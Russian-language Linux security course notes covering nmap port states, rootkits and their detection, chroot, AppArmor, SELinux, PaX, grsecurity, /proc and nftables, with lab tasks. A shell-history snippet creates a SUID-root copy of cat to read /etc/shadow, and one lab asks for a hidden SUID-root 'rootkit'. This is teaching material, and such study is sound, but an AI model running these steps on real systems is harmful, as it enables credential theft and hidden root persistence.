- unfiltered — Nmap не смог точно определить, открыт порт или закрыт, обычно такое значение присваивается при сканировании методом ACK </p>

<p><em>Вывод:</em></p>

<p>Закрыть порт нельзя никак кроме завершения процесса, его открывшего. Отфильтровать - можно.
Нет смысла "закрывать" на fw порты, которые не прослушиваются ни одной программой.</p>

<p>Подробнее:</p>

<p><a href="https://clck.ru/RN7sk">Сетевой сканер Nmap как средство аудита локальной сети</a></p>

<h2>Руткиты и их обнаружение</h2>

<p><a href="https://clck.ru/RN8GE">Установка, настройка и использование сканера уязвимостей chkrootkit</a></p>

<p>Руткит (англ. rootkit, то есть «набор root-а») — набор программных средств (например, исполняемых файлов, скриптов, конфигурационных файлов), обеспечивающих:</p>

<ul>
<li>маскировку объектов (процессов, файлов, каталогов, драйверов);</li>
<li>управление (событиями, происходящими в системе);</li>
<li>сбор данных (параметров системы).</li>
</ul>

<p>Термин Rootkit исторически пришёл из мира UNIX, и под этим термином понимается набор утилит или специальный модуль ядра, которые злоумышленник устанавливает на взломанной им компьютерной системе сразу после получения прав суперпользователя. Этот набор, как правило, включает в себя разнообразные утилиты для «заметания следов» вторжения в систему, делает незаметными снифферы, сканеры, кейлоггеры, троянские программы, замещающие основные утилиты UNIX (в случае не ядерного руткита). Rootkit позволяет взломщику закрепиться во взломанной системе и скрыть следы своей деятельности путём скрытия файлов, процессов, а также самого присутствия руткита в системе.</p>

<p>В систему руткит может быть установлен различными способами: загрузка посредством эксплойта, после получения шелл-доступа (в таком случае, может использоваться средство типа wget или исходный FTP-клиент для загрузки руткита с удаленного устройства), в исходном коде или ресурсах программного продукта. </p>

<ul>
<li>В Microsoft Windows
<ul>
<li>Захват таблиц вызовов</li>
<li>Перехват модификацией кода функции</li>
<li>DKOM (Direct Kernel Object Manipulation, прямая манипуляция объектами ядра)</li>
<li>Драйверы</li>
</ul></li>
<li>В UNIX и Linux
<ul>
<li>Подмена основных системных утилит </li>
<li>В виде модуля ядра и основанные на патчинге VFS или перехвате таблицы системных вызовов</li>
<li>Модификация физической памяти ядра.</li>
</ul></li>
</ul>

<p>Поиск:</p>

<ul>
<li>Сигнатурный поиск. Применяется еще со времен первых антивирусов и представляет собой поиск в проверяемом файле уникальной цепочки байтов (сигнатуры), присущей вредоносной программе.</li>
<li>Эвристический или поведенческий анализатор. Эта технология основывается на поиске отклонений в настройках системы, конфигурационных файлах Linux или реестре Windows, подозрительном поведении процессов и модулей и так далее.</li>
<li>Контроль целостности. Этот тип поиcка основан на сравнении контрольной суммы (MD5 и тому подобное) или цифровой пoдписи разнообразных системных файлов с базой, содержащей контрольную сумму оpигинальных файлов. В случае несовпадения программа делает вывод, что файл был модифицирован или вовсе заменен.</li>
</ul>

<h2>Лабораторные работы</h2>

<ol>
<li>Cоздать простейший руткит - разместить в "секретном" месте набор шелл-команд с SUID на root.</li>
<li>С его помощью создать фэйк-сервер http (код выше).</li>
<li>Попытаться обнаружить его различными типовыми сканерами.</li>
<li>Сформировать отчет на git.</li>
</ol>

<h2>Дополнения</h2>

<pre><code>tempname = md5sum(id)
202cb962ac59075b964b07152d234b70.jpeg

Если вероятность Х 1/1000 и события происходят с частотой 1Гц 
то надо 1000 сек для наступления некоторого события Х --- неверно!

На самом деле не столь важно, насколько крепок пароль
Важно чтоб у него (с солью) не было коллизий с простым.


x = network_read(connection);
y = get_data(x);
z = query(y);
respond(z);

=============================================================
|12|--- x ----|13|----- y ------|....
    xxxxxxxxxxxxx
    &lt;-----------+

            1234567812345678
chmod 666 &gt; 110110110???????
111111111
rwxrwxrwx
                user группа user группа
у процесса есть UID    GID  EUID  EGIT


2011  ls -l /usr/bin/passwd
2012  cat /etc/shadow
2013  which cat
2014  cp /bin/cat /tmp/
2015  /tmp/cat /etc/shadow
2016  sudo -i
499  chown root:root /tmp/cat 
500  chmod +s /tmp/cat 
2017  ls -l /tmp/cat 
2018  /tmp/cat /etc/shadow
</code></pre>

<h1>Модуль 3 Защита систем предприятия на уровне ОС</h1>

<h2>Обзор технологий, повышающих безопасность систем на уровне ОС</h2>

<h3>Инструмент Chroot</h3>

<p>chroot — операция изменения корневого каталога в Unix-подобных операционных системах. Программа, запущенная с изменённым корневым каталогом, будет иметь доступ только к файлам, содержащимся в данном каталоге. Поэтому, если нужно обеспечить программе доступ к другим каталогам или файловым системам (например, /proc), нужно заранее примонтировать в целевом каталоге необходимые каталоги или устройства.</p>

<p>Термин chroot может относиться или к концепции изменений корневого каталога, или к системному вызову chroot(2), или к программе chroot(8), что обычно понятно из контекста.</p>

<p>Изменение корневого каталога производится при помощи системного вызова chroot(2). Изменение корневого каталога затрагивает только текущий процесс (то есть процесс, сделавший системный вызов chroot(2)) и всех его потомков. Если требуется запустить некоторую программу с изменённым корневым каталогом, но в данной программе не предусмотрено выполнение вызова chroot(2), используют программу chroot(8). Эта программа принимает в качестве параметров новый корневой каталог и путь к программе. Она сначала сама выполняет вызов chroot(2) для изменения собственного корневого каталога на указанный, а затем запускает программу по заданному пути. Так как изменённый корневой каталог наследуется потомками процессов, программа запускается с изменённым корневым каталогом.</p>

<h3>Инструмент AppArmor</h3>

<p>AppArmor — программный инструмент упреждающей защиты, основанный на политиках безопасности (известных также как профили), которые определяют, к каким системным ресурсам и с какими привилегиями может получить доступ то или иное приложение. В AppArmor включён набор стандартных профилей, а также инструменты статического анализа и инструменты, основанные на обучении, позволяющие ускорить и упростить построение новых профилей.</p>

<p>Изначально программа была разработана компанией Immunix. После её приобретения компанией Novell инструмент был открыт под лицензией GNU GPL и включён в openSUSE. Позже адаптирован для Ubuntu.</p>

<p>В конце лета 2008 года Рассел Кокер, один из авторов SELinux, высказал мнение, что AppArmor бесперспективен, объяснив это тем, что даже в openSUSE появляется поддержка аналогичного и более популярного решения — SELinux. Однако вскоре разработку AppArmor продолжил сотрудник Canonical, а в июле 2010 года было объявлено о том, что AppArmor войдет в состав Linux-ядра версии 2.6.36. В мае 2013 года поддержка инструмента была внедрена в Debian 7 Wheezy.</p>

<p><img src="https:////upload.wikimedia.org/wikipedia/commons/thumb/b/ba/AppArmor_logo.svg/200px-AppArmor_logo.svg.png" alt="AppArmor logo.svg" title="" /></p>

<h3>Инструмент SELinux</h3>

<p>SELinux (англ. Security-Enhanced Linux — Linux с улучшенной безопасностью) — реализация системы принудительного контроля доступа, которая может работать параллельно с классической избирательной системой контроля доступа.</p>

<p>Оставаясь в рамках избирательной системы контроля доступа, операционная система имеет фундаментальное ограничение в плане разделения доступа процессов к ресурсам — доступ к ресурсам основывается на правах доступа пользователя. Это классические права rwx на трех уровнях — владелец, группа-владелец и остальные.</p>

<p>В SELinux права доступа определяются самой системой при помощи специально определенных политик. Политики работают на уровне системных вызовов и применяются самим ядром (но можно реализовать и на уровне приложения). SELinux действует после классической модели безопасности Linux. Иными словами, через SELinux нельзя разрешить то, что запрещено через права доступа пользователей или групп. Политики описываются при помощи специального гибкого языка описания правил доступа. В большинстве случаев правила SELinux «прозрачны» для приложений, и не требуется никакой их модификации. В состав некоторых дистрибутивов входят готовые политики, в которых права могут определяться на основе совпадения типов процесса (субъекта) и файла (объекта) — это основной механизм SELinux. Две других формы контроля доступа — доступ на основе ролей и на основе многоуровневой системы безопасности.</p>

<p><img src="https:////upload.wikimedia.org/wikipedia/commons/thumb/1/1e/SELinux_logo.svg/200px-SELinux_logo.svg.png" alt="SELinux logo.svg" title="" /></p>

<h3>Инструмент Docker</h3>

<p>Docker — программное обеспечение для автоматизации развёртывания и управления приложениями в средах с поддержкой контейнеризации. Позволяет «упаковать» приложение со всем его окружением и зависимостями в контейнер, который может быть перенесён на любую Linux-систему с поддержкой cgroups в ядре, а также предоставляет среду по управлению контейнерами. Изначально использовал возможности LXC, с 2015 года применял собственную библиотеку, абстрагирующую виртуализационные возможности ядра Linux — libcontainer. С появлением Open Container Initiative начался переход от монолитной к модульной архитектуре.</p>

<p>Разрабатывается и поддерживается одноимённой компанией-стартапом, распространяется в двух редакциях — общественной (Community Edition) по лицензии Apache 2.0 и для организаций (Enterprise Edition) по проприетарной лицензии . Написан на языке Go.</p>

<p>Проект начат как внутренняя собственническая разработка компании dotCloud, основанной Соломоном Хайксом (Solomon Hykes) в 2008 году с целью построения публичной PaaS-платформы с поддержкой различных языков программирования. Наряду с Хайксом в первоначальной разработке значительное участие приняли инженеры dotCloud Андреа Лудзарди (Andrea Luzzardi) и Франсуа-Ксавье Бурле (François-Xavier Bourlet).</p>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Docker-on-physical.svg/800px-Docker-on-physical.svg.png" alt="Docker" title="" /></p>

<h3>Инструмент PaX</h3>

<p>В компьютерной безопасности PaX (произн. «Пакс») — это патч к ядру Linux, который предоставляет возможность настроить минимальные права доступа приложений к страницам памяти. Таким образом обеспечивается достаточно тонкая настройка, с помощью которой программам разрешается выполнять только те действия, которые необходимы, исходя из предоставляемой ими функциональности, но не более того. PaX был впервые выпущен в 2000 году. С 2014 года распространяется только в составе проекта grsecurity, который стал платным с апреля 2017 года .</p>

<p>PaX помечает сегмент данных программ в памяти как недоступный для исполнения (так как он по определению не может содержать программных директив, которые необходимо выполнить), а сегмент кода — как не перезаписываемый, и, в придачу, при каждом запросе выделяет память программе из произвольных мест (рандомизация страниц памяти). Любая программа, которая пытается передать управление коду, находящемуся в недоступной для исполнения памяти, принудительно завершается.</p>

<p>Эта методика эффективна против применения различных эксплоитов, использующих, например, уязвимость, основанную на переполнении буфера памяти. Такая защита изначально полностью предотвращает прямое выполнение кода из памяти, и одновременно, с прикладной точки зрения, делает, так называемые, return-to-libc (ret2libc) атаки сложными для выполнения (они становятся выполняемыми скорее наудачу, без заранее предсказуемого результата). Однако, вместе с тем, PaX не предотвращает ошибки, приводящие к возможности переопределения переменных и значений указателей.</p>

<h3>Инструмент grsecurity</h3>

<p>Grsecurity — проприетарный набор модификаций (патч) для ядра Linux, который включает в себя некоторые улучшения, связанные с безопасностью, включая защиту памяти ядра и пользовательских процессов, принудительный контроль доступа, рандомизацию расположения объектов в памяти, ограничения доступа к файлам в /proc, ограничения доступа к системным интерфейсам внутри chroot() jail, ограничения на использование серверных и клиентских сетевых сокетов, а также дополнительные возможности аудита активности процессов и некоторые другие функции. Типичной областью применения являются системы, которые могут принимать сетевые подключения из потенциально опасных источников: такие как серверы различных сетевых служб (например, веб-серверы) или серверы, предоставляющие своим пользователям shell-доступ. Патч grsecurity с 2001 года выпускался на условиях лицензии GPL версии 2, и включает в себя набор патчей PaX. С 26 апреля 2017 года исходные коды grsecurity и связанных патчей больше не доступны для скачивания, а их распространение производится только на платной основе. Создатель и ведущий разработчик grsecurity — Brad Spengler, также известный под псевдонимом spender. </p>

<p>Изначально патч grsecurity являлся общедоступным и свободным ПО. В 2015 году, после споров о некорректном использовании торговой марки grsecurity автор патча решил прекратить свободное (неограниченное) распространение кодов стабильной версии патча для всех желающих. Тестовые версии grsecurity  в виде единого патча без разбивки на серии на тот момент оставались общедоступными.</p>

<p>С 26 апреля 2017 года был закрыт свободный доступ к тестовым версиям патча grsecurity (а также PaX), вероятно из-за конфликта с KSPP  или Wind River.  Последней общедоступной версией стал тестовый патч для ядра Linux 4.9 версии. Более новые версии становятся доступными лишь для коммерческих подписчиков компании "Open Source Security Inc" (разработчик патча с 2008 года, штат Пенсильвания), в рамках отдельного соглашения о предоставлении услуг.</p>

<h2>Файловая система /proc</h2>

<p><a href="https://clck.ru/RPD9f">Программирование в Linux. Файловая система /proc</a></p>

<p>Файловая система <code>/proc</code> является особой для GNU/Linux. Это виртуальная файловая система и она не занимает места на вашем диске. Это очень удобный способ получить информацию о системе, тем более, что большинство файлов в этом каталоге читаемы для человека (ну хорошо, с небольшой помощью). Большинство программ реально получают информацию из файлов в <code>/proc</code>, форматируют их своим способом, а затем отображают. Так делают все программы, которые отображают информацию о процессах, и некоторые из них мы уже видели (top, ps и сотоварищи). <code>/proc</code> это также хороший источник информации о ваших аппаратных средствах, и таким же образом некоторые программы являются только интерфейсами к информации, содержащейся в <code>/proc</code>.</p>

<p>Существует также специальный подкаталог <code>/proc/sys</code>. Он позволяет изменять некоторые параметры ядра в реальном режиме времени или отображать их.</p>

<h3>Информация о Процессах</h3>

<p>Если вы пролистаете содержимое каталога <code>/proc</code>, вы увидите много каталогов, названиями которых являются номера. Эти каталоги содержат информацию о все запущенных в данный момент процессах в системе:</p>

<pre><code>$ ls -d /proc/[0-9]*
/proc/1/    /proc/302/  /proc/451/  /proc/496/  /proc/556/  /proc/633/
/proc/127/  /proc/317/  /proc/452/  /proc/497/  /proc/557/  /proc/718/
/proc/2/    /proc/339/  /proc/453/  /proc/5/    /proc/558/  /proc/755/
/proc/250/  /proc/385/  /proc/454/  /proc/501/  /proc/559/  /proc/760/
/proc/260/  /proc/4/    /proc/455/  /proc/504/  /proc/565/  /proc/761/
/proc/275/  /proc/402/  /proc/463/  /proc/505/  /proc/569/  /proc/769/
/proc/290/  /proc/433/  /proc/487/  /proc/509/  /proc/594/  /proc/774/
/proc/3/    /proc/450/  /proc/491/  /proc/554/  /proc/595/
</code></pre>

<p>Имейте в виду, что как пользователь, вы можете увидеть информацию только о своих собственных процессах. Для других пользователей вы такой информации не получите. Поэтому перейдем в root и посмотрим какая информация доступна для процесса 127:</p>

<pre><code>$ su
Password:
# cd /proc/127
# ls -l
total 0
-r- -r- -r- -        1 root     root            0 Dec 14 19:53 cmdline
lrwx- - - - - -      1 root     root            0 Dec 14 19:53 cwd -&gt; //
-r- - - - - - - -    1 root     root            0 Dec 14 19:53 environ
lrwx- - - - - -      1 root     root            0 Dec 14 19:53 exe -&gt; /usr/sbin/apmd*
dr-x- - - - - -      2 root     root            0 Dec 14 19:53 fd/
pr- -r- -r- -        1 root     root            0 Dec 14 19:53 maps|
-rw- - - - - - -     1 root     root            0 Dec 14 19:53 mem
lrwx- - - - - -      1 root     root            0 Dec 14 19:53 root -&gt; //
-r- -r- -r- -        1 root     root            0 Dec 14 19:53 stat
-r- -r- -r- -        1 root     root            0 Dec 14 19:53 statm
-r- -r- -r- -        1 root     root            0 Dec 14 19:53 status
#
</code></pre>

<p>Каждый каталог содержит одинаковые входы. Вот краткое описание некоторых из них:</p>

<ul>
<li><p>cmdline: этот (псевдо-) файл содержит целую командную строку, использованную для вызова процесса. Он не отформатирован: нет пробелов между программой и ее аргументами, и нет разделителя в конце строки. Чтобы посмотреть его, вы можете использовать: perl -ple 's,\00, ,g' cmdline.</p></li>
<li><p>cwd: это символическая ссылка на текущий рабочий каталог (следует из имени) процесса.</p></li>
<li><p>environ Этот файл содержит все переменные окружения, определенные для процесса, в форме VARIABLE=value. Подобно cmdline, вывод не форматирован вообще: нет разделителей между различными переменными, и нет разделителя в конце. Единственное решение как его посмотреть: perl -pl -e 's,\00,\n,g' environ.</p></li>
<li><p>exe: это символическая ссылка на соответствующий запущенному процессу выполняемый файл.</p></li>
<li><p>fd: этот подкаталог содержит список файловых дескрипторов, открытых процессом в данный момент. Смотрите ниже.</p></li>
<li><p>maps: когда вы выводите содержимое именованной трубы (с помощью cat, например), вы можете видеть части адресного пространства процесса, которые в текущий момент отображаются в файле. Слева направо это поля: адресное пространство, связанное с этим отображением, права отображения, смещение с начала файла, где начинаются отображения, страший и младший номер (в шестнадцатиричном формате) устройства, где хранится файл отображения, номер узла файла и, последнее, имя файла. Когда устройство обозначено как 0 и нет номера узла и имени файла - это анонимное отображение.</p></li>
<li><p>root: Это символическая ссылка на корневой каталог, используемый процессом. Обычно это будет /.</p></li>
<li><p>status: этот файл содержит различную информацию о процессе: название выполняемой программы, его текущее состояние, его PID и PPID, его реальные и эффективные UID и GID, использование им памяти, и другое.</p></li>
</ul>

<p>Если мы выведем список файлов каталога fd для нашего процесса 127, мы получим следующее:</p>

<pre><code># ls -l fd
total 0
lrwx- - - - - -    1 root     root           64 Dec 16 22:04 0 -&gt; /dev/console
l-wx- - - - - -    1 root     root           64 Dec 16 22:04 1 -&gt; pipe:[128]
l-wx- - - - - -    1 root     root           64 Dec 16 22:04 2 -&gt; pipe:[129]
l-wx- - - - - -    1 root     root           64 Dec 16 22:04 21 -&gt; pipe:[130]
lrwx- - - - - -    1 root     root           64 Dec 16 22:04 3 -&gt; /dev/apm_bios
lr-x- - - - - -    1 root     root           64 Dec 16 22:04 7 -&gt; pipe:[130]
lrwx- - - - - -    1 root     root           64 Dec 16 22:04 9 -&gt;
/dev/console
#
</code></pre>

<p>Фактически, это список файловых дескрипторов, открытых процессом. Каждый открытый дескриптор обозначен символической ссылкой, именем каждого номера дескриптора, и указателем на файл, открытый этим дескриптором. Обратите также внимание на права symlinks: это единственное место, где они имеют смысл, поскольку они представляют права, с которыми файл, соответствующий дескриптору, был открыт. </p>

<h3>Информация об aппаратном oбеспечении</h3>

<p>Кроме каталогов, связанных с различными процессами, <code>/proc</code> также содержит несметное количество информации об аппаратном обеспечении вашей машины. Список файлов каталога <code>/proc</code> показывает следующее:</p>

<pre><code>$ ls -d [a-z]*
apm      dma          interrupts  loadavg  mounts      rtc       swaps
bus/     fb           ioports     locks    mtrr        scsi/     sys/
cmdline  filesystems  kcore       meminfo  net/        self/     tty/
cpuinfo  fs/          kmsg        misc     partitions  slabinfo  uptime
devices  ide/         ksyms       modules  pci         stat      version
$
</code></pre>

<p>Если мы посмотрим, например, содержимое <code>/proc/interrupts</code>, мы можем увидеть, что тут есть список прерываний, используемых системой на данный момент, а также периферийных устройств, которые держат их. Точно так же, каталог ioports содержит список адресных интервалов ввода-вывода, занятых в настоящее время , и наконец, dma делает то же самое для каналов DMA. Поэтому, чтобы найти конфликт, нужно смотреть содержание этих трех файлов:</p>

<pre><code>$ cat interrupts
           CPU0
  0:     127648          XT-PIC  timer
  1:       5191          XT-PIC  keyboard
  2:          0          XT-PIC  cascade
  5:       1402          XT-PIC  xirc2ps_cs
  8:          1          XT-PIC  rtc
 10:          0          XT-PIC  ESS Solo1
 12:       2631          XT-PIC  PS/2 Mouse
 13:          1          XT-PIC  fpu
 14:      73434          XT-PIC  ide0
 15:      80234          XT-PIC  ide1
NMI:          0

$ cat ioports
0000-001f : dma1
0020-003f : pic1
0040-005f : timer
0060-006f : keyboard
0070-007f : rtc
0080-008f : dma page reg
00a0-00bf : pic2
00c0-00df : dma2
00f0-00ff : fpu
0170-0177 : ide1
01f0-01f7 : ide0
0300-030f : xirc2ps_cs
0376-0376 : ide1
03c0-03df : vga+
03f6-03f6 : ide0
03f8-03ff : serial(auto)
1050-1057 : ide0
1058-105f : ide1
1080-108f : ESS Solo1
10c0-10cf : ESS Solo1
10d4-10df : ESS Solo1
10ec-10ef : ESS Solo1

$ cat dma
 4: cascade
</code></pre>

<p>Или проще, использовать команду lsdev, которая получает информацию из этих трех файлов и сортирует ее по периферийным устройствам:</p>

<pre><code>$ lsdev
Device            DMA   IRQ  I/O Ports
- - ----------------------------------------------
cascade             4     2
dma                          0080-008f
dma1                         0000-001f
dma2                         00c0-00df
ESS                          1080-108f 10c0-10cf 10d4-10df 10ec-10ef
fpu                      13  00f0-00ff
ide0                     14  01f0-01f7 03f6-03f6 1050-1057
ide1                     15  0170-0177 0376-0376 1058-105f
keyboard                  1  0060-006f
Mouse                    12
pic1                         0020-003f
pic2                         00a0-00bf
rtc                       8  0070-007f
serial                       03f8-03ff
Solo1                    10
timer                     0  0040-005f
vga+                         03c0-03df
xirc2ps_cs                5  0300-030f
</code></pre>

<p>Полная распечатка файлов была бы слишком длинной, тем не менее приведем описание некоторых из них:</p>

<ul>
<li><p>cpuinfo: этот файл содержит, соответственно своему названию, информацию о процессоре(рах) в вашей машине.</p></li>
<li><p>modules: этот файл содержит список модулей, которые используются ядром в данный момент, а также процент использования для каждого модуля. Фактически, это та же самая информация, которую предоставляет команда lsmod.</p></li>
<li><p>meminfo: этот файл предоставляет информацию о загрузке памяти на момент запроса. Более аккуратно форматированный вид этой же информации можно получить командой free.</p></li>
<li><p>apm: если у вас портативный компьютер, то вывод этого файла предоставит вам информацию о состоянии батарей. Вы сможете увидеть куда подключен AC, текущую загрузку батарей, и, если APM BIOS вашего ноутбука поддерживает это (к сожалению это не всегда так), то вы сможете увидеть еще и сколько времени в минутах батареи смогут проработать. Файл не очень читаем, поэтому лучше использовать вместо него команду apm, которая предоставит информацию в "человекочитаемом" виде.</p></li>
<li><p>bus: этот подкаталог предоставит вам информацию о всех периферийных устройствах, найденных на различных шинах вашего компьютера. Информация внутри него редко вообще читаема, и главным образом с ней имеют дело и умеют форматировать внешние утилиты, такие как: lspcidrake, lspnp, и др..</p></li>
</ul>

<h2>Подкаталог /proc/sys</h2>

<p>Задача этого каталога - сообщать о различных параметрах ядра и позволять замену некоторых из них в реальном режиме времени. В противоположность всем другим файлам каталога /proc, некоторые файлы этого каталога могут быть записаны, но только под root</p>

<p>Список каталогов и файлов был бы слишком большим, тем более что их наличие преимущественно зависит от конкретно вашей системы, а большинство файлов будет использоваться только для очень специализированных приложений. Тем не менее, приведем три обычных случая использования этого подкаталога:</p>

<p>Разрешение роутинга: Даже если заданное по умолчанию ядро от Mandrake Linux может роутить, вы должны явно позволить ему это делать. Для этого нужно под root напечатать следующее:</p>

<pre><code># echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</code></pre>

<p>Замените 1 на 0, если вы хотите запретить роутинг.</p>

<p>Предотвращение подмены IP: имитация IP состоит в том, чтобы заставить интерфейс поверить в то, что пакет, пришедший из мира, является его собственным, вышедшим из него пакетом. Эта техника очень часто используется кракерами [23], но вы можете заставить ядро предотвращать такие вторжения. Вам только нужно написать:</p>

<pre><code># echo 1 &gt; /proc/sys/net/ipv4/conf/all/rp_filter
</code></pre>

<p>и все типы таких атак становятся невозможными.</p>

<p>Увеличение размера таблицы открытых файлов и таблицы inode: Размер таблицы открытых файлов и таблицы inode является динамическим под GNU/Linux. Значений по умолчанию обычно достаточно, но они могут быть недостаточными если ваша машина - нагруженный сервер (например, сервер баз данных). Реально, первым препятствием может стать тот факт, что процессы больше не смогут открывать файлы по той причине, что таблица полна, поэтому вам нужно увеличить ее размер. В то же время вам нужно будет увеличить и размер таблицы inode. Вот две строчки, которые решают эту проблему:</p>

<pre><code>$ echo 8192 &gt; /proc/sys/fs/file-max
$ echo 16384 &gt; /proc/sys/fs/inode-max
</code></pre>

<p>Чтобы это выполнялось при каждой загрузке системы, вы можете добавить все эти строки в /etc/rc.d/rc.local и таким образом избежать их набора каждый раз заново, но есть и другое решение, состоящее в том, чтобы заполнить файл /etc/sysctl.conf.</p>

<h2>Сравнение iptables и nftables</h2>

<p><a href="https://clck.ru/RPDX3">iptables против nftables: в чем разница?</a></p>

<p>Nftables разработан в Netfilter - той же организации, которая в настоящее время поддерживает IPTables. Он был создан для решения проблем с настройкой iptables, а именно масштабируемости и производительности. Основная идея - отказ от различных систем фильтров для ipv6 и ipv4 - инфраструктура iptables стала немного запутанной с iptables, ip6tables, arptables и ebtables, которые предоставляют разные, но схожие функции.</p>

<p>Nftables становится рекомендуемым брандмауэром, и администраторы Linux должны обновить свои инструменты. Сейчас самое время изучить nftables и обновить существующую конфигурацию iptables.</p>

<h3>Цепочки и правила в nftables</h3>

<p>В iptables есть три цепочки по умолчанию: ввод, вывод и пересылка. Эти три «цепочки» (и другие цепочки, если они у вас настроены) содержат «правила», и iptables работает путем сопоставления сетевого трафика со списком правил в цепочке. Если исследуемый трафик не соответствует ни одному правилу, в трафике будет использоваться политика цепочки по умолчанию (т. е. ACCEPT, DROP).</p>

<p>Nftables работает аналогично этому, с «цепями» и «правилами». Однако он не начинается с каких-либо базовых цепей, что делает настройку немного более гибкой.</p>

<h3>Установка nftables в Linux</h3>

<p>Nftables доступен во всех основных дистрибутивах Linux, и вы можете легко установить его, используя менеджер пакетов ваших дистрибутивов.</p>

<p>В дистрибутиве на основе Ubuntu или Debian вы можете использовать эту команду:</p>

<pre><code>sudo apt install nftables
</code></pre>

<p>Чтобы убедиться, что nftables запускается автоматически при перезагрузке системы, выполните:</p>

<pre><code>sudo systemctl enable nftables.service
</code></pre>

<h3>Синтаксическая разница между iptables и nftables</h3>

<p>Nftables имеет другой и гораздо более простой синтаксис, чем iptables, отнако nftables по-прежнему принимает старый синтаксис.
Есть и утилита iptables-translate, которая будет принимать команды iptables и преобразовывать их в эквивалент nftables. Это простой способ увидеть разницу между двумя синтаксисами.</p>

<p>Установите iptables-translate в дистрибутиве на основе Ubuntu и Debian с помощью этой команды:</p>

<pre><code>sudo apt install iptables-nftables-compat
</code></pre>

<p>После установки вы можете передать синтаксис iptables команде iptables-translate, и она вернет эквивалентную команду nftables.</p>

<p>Давайте рассмотрим несколько примеров, чтобы вы могли увидеть, как эти команды отличаются друг от друга.</p>

<h4>Блокировка входящих соединений</h4>

<p>Эта команда заблокирует входящие соединения с IP-адреса 192.168.2.1:</p>

<pre><code>$ iptables-translate -A INPUT -s 192.168.2.1 -j DROP

nft add rule ip filter INPUT ip saddr 192.168.2.1 counter drop
</code></pre>

<h4>Разрешение входящих соединений SSH</h4>

<p>Давайте рассмотрим еще несколько примеров – обычные вещи, которые вы обычно вводите в iptables при усилении защиты сервера Linux.</p>

<pre><code>$ iptables-translate -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
nft add rule ip filter INPUT tcp dport 22 ct state new,established counter accept
</code></pre>

<p>Разрешить входящие соединения SSH из определенного диапазона IP</p>

<p>Если вы хотите разрешить входящие SSH-соединения с 192.168.1.0/24:</p>

<pre><code>$ iptables-translate -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
nft add rule ip filter INPUT ip saddr 192.168.1.0/24 tcp dport 22 ct state new,established counter accept
</code></pre>

<p>Разрешить подключения MySQL к сетевому интерфейсу eth0</p>

<pre><code>$ iptables-translate -A INPUT -i eth0 -p tcp --dport 3306 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
nft add rule ip filter INPUT iifname eth0 tcp dport 3306 ct state new,established counter accept
</code></pre>

<p>Чтобы разрешить трафик определенного типа f, вот синтаксис для обеих команд:</p>

<pre><code>$ iptables-translate -A INPUT -p tcp -m multiport --dports 80,443 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
nft add rule ip filter INPUT ip protocol tcp tcp dport { 80,443} ct state new,established counter accept
</code></pre>

<p>Как видно из этих примеров, синтаксис все еще очень похож на iptables, но команды немного более интуитивно понятны.</p>

<h3>Журналирование с помощью nftables</h3>

<p>Опция «counter», присутствующая в приведенных выше примерах команды nft, указывает nftables подсчитывать количество раз, когда к правилу обращаются, как это делают iptables по умолчанию.</p>

<p>В nftables они являются необязательными и должны быть указаны.</p>

<pre><code>nft add rule ip filter INPUT ip saddr 192.168.2.1 counter accept
</code></pre>

<p>Nftables имеет встроенные опции для экспорта вашей конфигурации. В настоящее время он поддерживает XML и JSON.</p>

<pre><code>nft export xml
</code></pre>

<h2>Лабораторные работы</h2>

<p>1) Определить файлы, открытые процессом, используя lsof и proc.</p>

<p>Cравнить удобство использования обоих способов.</p>

<p>2) Поместить fakehttp сервер (или иное приложение) в контейнер Docker</p>
